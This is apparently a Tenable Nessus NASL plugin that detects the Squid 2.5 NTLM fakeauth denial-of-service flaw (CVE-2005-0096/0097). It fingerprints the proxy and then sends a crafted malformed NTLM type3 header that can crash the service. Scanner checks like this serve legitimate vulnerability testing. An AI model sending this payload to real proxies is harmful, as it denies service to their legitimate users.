#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if (description) {
  script_id(16163);
  script_version ("$Revision: 1.18 $");
  script_cve_id("CVE-2005-0096", "CVE-2005-0097");
  script_bugtraq_id(12220, 12324);
  script_osvdb_id(12816, 13114);

  script_name(english:"Squid NTLM Component fakeauth Multiple Remote DoS");
  script_summary(english:"Squid Remote NTLM fakeauth Denial of Service");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:'The remote SQUID server, an open source Proxy server, is vulnerable
to a Denial of Service in the fakeauth NTLM authentication module.

Exploitation of this bug can allow remote attackers to deny access to
legitimate users.

Squid 2.5*-STABLE are reported vulnerable.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'Apply the relevant patch from
http://www.squid-cache.org/Versions/v2/2.5/bugs/squid-2.5.STABLE7-fakeauth_auth.patch'
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  # http://www.squid-cache.org/Versions/v2/2.5/bugs/#squid-2.5.STABLE7-fakeauth_auth
  script_set_attribute(
    attribute:'see_also',
    value:'http://www.nessus.org/u?af6b5d37'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/01/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/01/08");
 script_cvs_date("$Date: 2016/12/14 20:33:26 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:squid-cache:squid");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_family(english:"Firewalls");
  script_dependencies("proxy_use.nasl");
  script_require_ports("Services/http_proxy", 8080, 3128);

  exit(0);
}

# Keep the old API for that test
include("http_func.inc");
include("misc_func.inc");


# start script

port = get_service(svc:"http_proxy", default: 3128, exit_on_fail: 1);


host = string("http://www.f0z73", rand() % 65536, "tinker.com/");
req = string (
       "GET " , host , " HTTP/1.1\r\n" ,
      "Proxy-Connection: Keep-Alive\r\n" ,
      "Host: " , host , "\r\n" ,
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n" ,
      "Pragma: no-cache\r\n");

type1req = string (req , "Proxy-Authorization: NTLM TlRMTVNTUAABAAAAA7IAAAwADAAsAAAADAAMACAAAABOTkVFU1NTU1VVU1NOTkVFU1NTU1VVU1M=\r\n\r\n");

type3req = string (req , "Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAGQAAAAYABgAfAAAAAwADABAAAAADAAMAEwAAAAMAAwAWAAAAAAAAADIAAAAAYIAAE5ORUVTU1NTVVVTU05ORUVTU1NTVVVTU05ORUVTU1NTVVVTU0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==\r\n\r\n");

type3req_attack = string (req , "Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAGQAAAAYABgAfAAAAAwADABAAAAADAAMAEwAAAAMAAwAWAAAAAAAAADIAAAAAYIAAE5ORUVTU1NTVVVTU05ORUVTAFNTVVVTU05ORUVTU1NTVVVTU0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==\r\n\r\n");


soc = open_sock_tcp (port);
if (!soc) exit (0);

# First we send type1 req
send(socket:soc, data:type1req);
r = http_recv(socket:soc);

if (!r) exit(0);


# Checks if SQUID with Proxy-Authenticate: NTLM
if (!egrep(pattern:"^Server: squid/", string:r) || !egrep(pattern:"^Proxy-Authenticate: NTLM", string:r))
  exit(0);

# Now type3req
send(socket:soc, data:type3req);
r = http_recv(socket:soc);

if (!r) exit(0);


close (soc);
soc = open_sock_tcp (port);
if (!soc) exit (0);

# We retry with a malicious request

# First we send type1 req
send(socket:soc, data:type1req);
r = http_recv(socket:soc);

if (!r) exit(0);

# Now type3req
send(socket:soc, data:type3req_attack);
r = http_recv(socket:soc);

if (!r)
  security_warning( port:port );


close (soc);
